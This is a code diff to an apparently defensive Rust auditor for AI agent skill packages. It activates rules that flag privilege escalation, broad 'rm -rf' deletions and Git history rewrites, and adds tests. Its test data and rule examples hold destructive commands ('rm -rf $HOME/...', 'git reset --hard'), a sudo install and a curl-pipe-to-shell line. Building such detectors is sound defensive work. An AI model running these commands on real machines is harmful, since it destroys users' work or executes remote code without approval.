@@ -5,8 +5,8 @@ use std::fmt;
 
 use agent_audit_hosts::HOST_PROFILES;
 use agent_audit_security::{
-    AnalyzerConfidence, SecuritySignal, SecuritySignalKind, SecuritySink, SecuritySinkKind,
-    SecuritySource, SecuritySourceKind,
+    AnalyzerConfidence, SecuritySignal, SecuritySignalKind, SecuritySignalPathContext,
+    SecuritySink, SecuritySinkKind, SecuritySource, SecuritySourceKind,
 };
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
@@ -322,6 +322,8 @@ pub const ACTIVE_RULE_IDS: &[&str] = &[
     "SEC001",
     "SEC002",
     "SEC003",
+    "SEC005",
+    "SEC006",
     "SEC007",
     "SEC009",
     "SEC011",
@@ -344,15 +346,7 @@ pub const ACTIVE_RULE_IDS: &[&str] = &[
     "SUPPLY012",
 ];
 
-pub const RESERVED_RULE_IDS: &[&str] = &[
-    "SEC004",
-    "SEC005",
-    "SEC006",
-    "SEC008",
-    "SEC010",
-    "SUPPLY001",
-    "SUPPLY011",
-];
+pub const RESERVED_RULE_IDS: &[&str] = &["SEC004", "SEC008", "SEC010", "SUPPLY001", "SUPPLY011"];
 
 pub const ALL_HOST_PROFILES: &[&str] = HOST_PROFILES;
 
@@ -398,9 +392,10 @@ const SEC005_EXAMPLES: &[RuleExample] = &[RuleExample {
 }];
 
 const SEC006_EXAMPLES: &[RuleExample] = &[RuleExample {
-    summary: "Do not rewrite repository history from skill automation.",
-    non_compliant: "git reset --hard HEAD~1",
-    compliant: "git status --short\n# Ask the user before making any history-changing operation.",
+    summary: "Do not delete broad filesystem targets or rewrite repository history from skill automation.",
+    non_compliant: "rm -rf $HOME/.cache/demo\ngit reset --hard HEAD~1",
+    compliant:
+        "git status --short\n# Show the requested cleanup or history operation and ask the user to approve or run it.",
 }];
 
 const SEC007_EXAMPLES: &[RuleExample] = &[RuleExample {
@@ -610,8 +605,8 @@ pub const RULE_METADATA: &[RuleMetadata] = &[
     },
     RuleMetadata {
         id: RuleId::Sec005,
-        status: RuleStatus::Reserved,
-        title: "Use of sudo",
+        status: RuleStatus::Active,
+        title: "Privilege escalation or system-level modification",
         severity: RuleSeverity::Medium,
         category: RuleCategory::Security,
         applicable_profiles: ALL_HOST_PROFILES,
@@ -619,21 +614,21 @@ pub const RULE_METADATA: &[RuleMetadata] = &[
         rationale: "Privilege escalation can make a skill modify system state outside the repository and can turn otherwise limited commands into machine-wide changes.",
         remediation: "Remove `sudo`, document prerequisites, or require the user to perform privileged setup outside the skill workflow.",
         suppression_guidance:
-            "`SEC005` is reserved and cannot be suppressed until an evaluator emits it. When active, suppress only when the privileged action is optional, documented, and explicitly user-controlled.",
+            "Suppress `SEC005` only when the privileged action is optional, documented, explicitly user-controlled, and cannot run without deliberate confirmation.",
         examples: SEC005_EXAMPLES,
     },
     RuleMetadata {
         id: RuleId::Sec006,
-        status: RuleStatus::Reserved,
-        title: "Git history modification",
+        status: RuleStatus::Active,
+        title: "Destructive filesystem or repository history operation",
         severity: RuleSeverity::Medium,
         category: RuleCategory::Security,
         applicable_profiles: ALL_HOST_PROFILES,
         input_node_types: SECURITY_ARTIFACT_INPUT,
-        rationale: "History-changing Git commands can destroy work, hide changes, or make audit evidence disappear when run without deliberate user approval.",
-        remediation: "Avoid destructive Git operations in skill artifacts; report the requested command and require the user to run or approve it explicitly.",
+        rationale: "Destructive filesystem commands and history-changing Git commands can destroy work, hide changes, or make audit evidence disappear when run without deliberate user approval.",
+        remediation: "Avoid broad destructive operations in skill artifacts; report the requested cleanup or history command and require the user to run or approve it explicitly.",
         suppression_guidance:
-            "`SEC006` is reserved and cannot be suppressed until an evaluator emits it. When active, suppress only for a reviewed workflow that cannot run without direct user confirmation.",
+            "Suppress `SEC006` only for a reviewed workflow that clearly scopes the destructive target and cannot run without direct user confirmation.",
         examples: SEC006_EXAMPLES,
     },
     RuleMetadata {
@@ -1346,6 +1341,12 @@ pub fn evaluate_security_signal_rules_for_mode(
         }
         if is_hidden_instruction_signal(signal) {
             findings.push(hidden_instruction_finding(signal));
+        }
+        if is_privilege_escalation_signal(signal) {
+            findings.push(privilege_escalation_finding(signal));
+        }
+        if is_destructive_operation_signal(signal) {
+            findings.push(destructive_operation_finding(signal));
         }
     }
     findings.extend(external_data_exfiltration_findings(signals));
@@ -2746,6 +2747,119 @@ fn hidden_instruction_finding(signal: &SecuritySignal) -> EvaluatedRuleFinding {
     }
 }
 
+fn is_default_phase_a_executable_signal(signal: &SecuritySignal) -> bool {
+    signal.confidence == AnalyzerConfidence::High
+        && signal.context.executable
+        && !signal.context.path_classifications.iter().any(|context| {
+            matches!(
+                context,
+                SecuritySignalPathContext::DocumentationOrExample
+                    | SecuritySignalPathContext::Fixture
+                    | SecuritySignalPathContext::GeneratedOrVendorLike
+                    | SecuritySignalPathContext::Lockfile
+            )
+        })
+}
+
+fn is_privilege_escalation_signal(signal: &SecuritySignal) -> bool {
+    signal.kind == SecuritySignalKind::PrivilegeEscalation
+        && is_default_phase_a_executable_signal(signal)
+        && signal
+            .sink
+            .as_ref()
+            .is_some_and(|sink| sink.kind == SecuritySinkKind::PrivilegeEscalation)
+}
+
+fn privilege_escalation_finding(signal: &SecuritySignal) -> EvaluatedRuleFinding {
+    let target = signal
+        .sink
+        .as_ref()
+        .and_then(|sink| sink.target.as_deref())
+        .unwrap_or("privileged command");
+
+    EvaluatedRuleFinding {
+        rule_id: RuleId::Sec005,
+        message: format!(
+            "The executable artifact invokes `{target}` for privilege escalation or system-level modification. Keep privileged setup outside the skill workflow or require explicit user control."
+        ),
+        location: RuleFindingLocation {
+            path: signal.location.path.clone(),
+            line: signal.location.line,
+        },
+    }
+}
+
+fn is_destructive_operation_signal(signal: &SecuritySignal) -> bool {
+    if !is_default_phase_a_executable_signal(signal) {
+        return false;
+    }
+
+    match signal.kind {
+        SecuritySignalKind::GitHistoryModification => signal
+            .sink
+            .as_ref()
+            .is_some_and(|sink| sink.kind == SecuritySinkKind::GitHistoryRewrite),
+        SecuritySignalKind::DestructiveCommand => {
+            signal
+                .sink
+                .as_ref()
+                .is_some_and(|sink| sink.kind == SecuritySinkKind::FileDelete)
+                && destructive_command_has_high_risk_target(&signal.evidence)
+        }
+        _ => false,
+    }
+}
+
+fn destructive_command_has_high_risk_target(evidence: &str) -> bool {
+    let tokens = shellish_tokens(evidence);
+    let Some(rm_index) = tokens.iter().position(|token| token == "rm") else {
+        return false;
+    };
+
+    tokens[rm_index + 1..]
+        .iter()
+        .take_while(|token| !is_shell_command_separator(token))
+        .filter(|token| !token.starts_with('-'))
+        .any(|token| destructive_target_is_high_risk(token))
+}
+
+fn destructive_target_is_high_risk(target: &str) -> bool {
+    let target = strip_quotes(target)
+        .replace('\\', "/")
+        .to_ascii_lowercase();
+
+    target == "."
+        || target == "*"
+        || target == "/"
+        || target.starts_with("/")
+        || target.starts_with("~/")
+        || target.starts_with("$home/")
+        || target.starts_with("${home}/")
+        || target.starts_with("%userprofile%/")
+        || target.contains("/../")
+        || target.starts_with("../")
+        || starts_with_windows_absolute_path(&target)
+}
+
+fn destructive_operation_finding(signal: &SecuritySignal) -> EvaluatedRuleFinding {
+    let target = signal
+        .sink
+        .as_ref()
+        .and_then(|sink| sink.target.as_deref())
+        .unwrap_or("destructive operation");
+
+    EvaluatedRuleFinding {
+        rule_id: RuleId::Sec006,
+        message: format!(
+            "The executable artifact contains `{target}`, a destructive filesystem or repository history operation. Remove it or require explicit user confirmation before it can run."
+        ),
+        location: RuleFindingLocation {
+            path: signal.location.path.clone(),
+            line: signal.location.line,
+        },
+    }
+}
+
 fn external_data_exfiltration_findings(signals: &[SecuritySignal]) -> Vec<EvaluatedRuleFinding> {
     let mut findings = BTreeMap::new();
 
@@ -3354,8 +3468,8 @@ mod tests {
         SecurityAnalyzerArtifactInput, SecurityAnalyzerContent, SecurityAnalyzerInput,
         SecurityAnalyzerPackageContext, SecurityArtifactClassificationMethod,
         SecurityArtifactClassificationSignal, SecurityArtifactKind, SecurityArtifactReadStatus,
-        SecurityLanguage, SecurityRiskScore, SecuritySink, SecuritySinkKind, SecuritySource,
-        SecuritySourceKind,
+        SecurityLanguage, SecurityRiskScore, SecuritySignalContentContext, SecuritySink,
+        SecuritySinkKind, SecuritySource, SecuritySourceKind,
     };
 
     fn normalize_line_endings(value: &str) -> String {
@@ -3815,6 +3929,33 @@ mod tests {
         assert!(metadata
             .suppression_guidance
             .contains("user explicitly selected"));
+    }
+
+    #[test]
+    fn sec005_and_sec006_are_active_and_removed_from_reserved_rules() {
+        for (rule_id, title) in [
+            (
+                "SEC005",
+                "Privilege escalation or system-level modification",
+            ),
+            (
+                "SEC006",
+                "Destructive filesystem or repository history operation",
+            ),
+        ] {
+            assert!(ACTIVE_RULE_IDS.contains(&rule_id));
+            assert!(!RESERVED_RULE_IDS.contains(&rule_id));
+
+            let metadata = active_rule_metadata(rule_id).expect("security rule must be active");
+
+            assert_eq!(metadata.status, RuleStatus::Active);
+            assert_eq!(metadata.title, title);
+            assert_eq!(metadata.severity, RuleSeverity::Medium);
+            assert_eq!(metadata.category, RuleCategory::Security);
+            assert!(!metadata
+                .suppression_guidance
+                .contains("cannot be suppressed"));
+        }
     }
 
     #[test]
@@ -4952,6 +5093,142 @@ mod tests {
     }
 
     #[test]
+    fn sec005_reports_high_confidence_privilege_escalation_in_executable_context() {
+        let output = shell_security_analyzer().analyze(&shell_analyzer_input(
+            "scripts/install.sh",
+            b"sudo apt-get install -y jq\n",
+        ));
+        let findings = evaluate_security_signal_rules(&output.signals);
+
+        assert_eq!(
+            findings,
+            vec![finding(
+                RuleId::Sec005,
+                "The executable artifact invokes `sudo` for privilege escalation or system-level modification. Keep privileged setup outside the skill workflow or require explicit user control.",
+                "scripts/install.sh",
+                Some(1),
+            )]
+        );
+    }
+
+    #[test]
+    fn sec006_reports_high_confidence_destructive_and_git_history_operations() {
+        let scripts = [
+            ("scripts/cleanup.sh", "rm -rf $HOME/.cache/demo\n"),
+            ("scripts/rewrite.sh", "git reset --hard HEAD~1\n"),
+        ];
+        let signals = scripts
+            .into_iter()
+            .flat_map(|(path, script)| {
+                shell_security_analyzer()
+                    .analyze(&shell_analyzer_input(path, script.as_bytes()))
+                    .signals
+            })
+            .collect::<Vec<_>>();
+        let findings = evaluate_security_signal_rules(&signals);
+
+        assert_eq!(
+            finding_projection(&findings),
+            vec![
+                (RuleId::Sec006, "scripts/cleanup.sh", Some(1)),
+                (RuleId::Sec006, "scripts/rewrite.sh", Some(1)),
+            ]
+        );
+        assert!(findings
+            .iter()
+            .any(|finding| finding.message.contains("rm -rf")));
+        assert!(findings
+            .iter()
+            .any(|finding| finding.message.contains("git history rewrite")));
+    }
+
+    #[test]
+    fn sec006_does_not_report_bounded_generated_cleanup() {
+        let output = shell_security_analyzer().analyze(&shell_analyzer_input(
+            "scripts/generate.sh",
+            b"rm -rf generated/cache\n",
+        ));
+        let findings = evaluate_security_signal_rules(&output.signals);
+
+        assert!(
+            findings
+                .iter()
+                .all(|finding| finding.rule_id != RuleId::Sec006),
+            "bounded generated cleanup emitted SEC006: {findings:#?}"
+        );
+    }
+
+    #[test]
+    fn sec005_and_sec006_require_high_confidence_executable_context() {
+        let mut prose = executable_security_signal(
+            SecuritySignalKind::PrivilegeEscalation,
+            Some(SecuritySinkKind::PrivilegeEscalation),
+            Some("sudo"),
+            AnalyzerConfidence::High,
+            "SKILL.md",
+        );
+        prose.context = agent_audit_security::SecuritySignalContext::manifest_prose("SKILL.md");
+
+        let mut fenced_code = executable_security_signal(
+            SecuritySignalKind::DestructiveCommand,
+            Some(SecuritySinkKind::FileDelete),
+            Some("rm -rf"),
+            AnalyzerConfidence::High,
+            "SKILL.md",
+        );
+        fenced_code.context =
+            agent_audit_security::SecuritySignalContext::manifest_fenced_code("SKILL.md");
+
+        let low_confidence = executable_security_signal(
+            SecuritySignalKind::GitHistoryModification,
+            Some(SecuritySinkKind::GitHistoryRewrite),
+            Some("git history rewrite"),
+            AnalyzerConfidence::Medium,
+            "scripts/rewrite.sh",
+        );
+
+        assert!(evaluate_security_signal_rules(&[prose, fenced_code, low_confidence]).is_empty());
+    }
+
+    #[test]
+    fn sec005_and_sec006_skip_docs_examples_fixtures_generated_vendor_and_lockfiles() {
+        let cases = [
+            "skills/demo/docs/install.sh",
+            "skills/demo/examples/install.sh",
+            "fixtures/security/demo/scripts/install.sh",
+            "skills/demo/scripts/generated/install.sh",
+            "skills/demo/vendor/install.sh",
+            "skills/demo/package-lock.json",
+        ];
+
+        for path in cases {
+            let signals = vec![
+                executable_security_signal(
+                    SecuritySignalKind::PrivilegeEscalation,
+                    Some(SecuritySinkKind::PrivilegeEscalation),
+                    Some("sudo"),
+                    AnalyzerConfidence::High,
+                    path,
+                ),
+                executable_security_signal(
+                    SecuritySignalKind::DestructiveCommand,
+                    Some(SecuritySinkKind::FileDelete),
+                    Some("rm -rf"),
+                    AnalyzerConfidence::High,
+                    path,
+                ),
+            ];
+
+            let findings = evaluate_security_signal_rules(&signals);
+
+            assert!(
+                findings.is_empty(),
+                "{path} emitted default Phase A findings: {findings:#?}"
+            );
+        }
+    }
+
+    #[test]
     fn fixture_prompt_injection_manifest_emits_sec011_through_analyzer_and_rule_evaluator() {
         let fixture_path = Path::new(env!("CARGO_MANIFEST_DIR"))
             .join("../..")
@@ -6014,6 +6291,31 @@ mod tests {
             context: agent_audit_security::SecuritySignalContext::default(),
             evidence: "curl https://example.test/install.sh | sh".to_owned(),
         }
+    }
+
+    fn executable_security_signal(
+        kind: SecuritySignalKind,
+        sink: Option<SecuritySinkKind>,
+        sink_target: Option<&str>,
+        confidence: AnalyzerConfidence,
+        path: &str,
+    ) -> SecuritySignal {
+        let mut signal = security_signal_with_source_name_and_sink_target(
+            kind,
+            None,
+            sink,
+            confidence,
+            None,
+            sink_target,
+        );
+        signal.location.path = path.to_owned();
+        signal.context = agent_audit_security::security_signal_context_for_artifact(
+            path,
+            SecurityArtifactKind::Script,
+            SecuritySignalContentContext::ExecutableScript,
+            true,
+        );
+        signal
     }
 
     fn file_write_signal_with_target(target: &str) -> SecuritySignal {
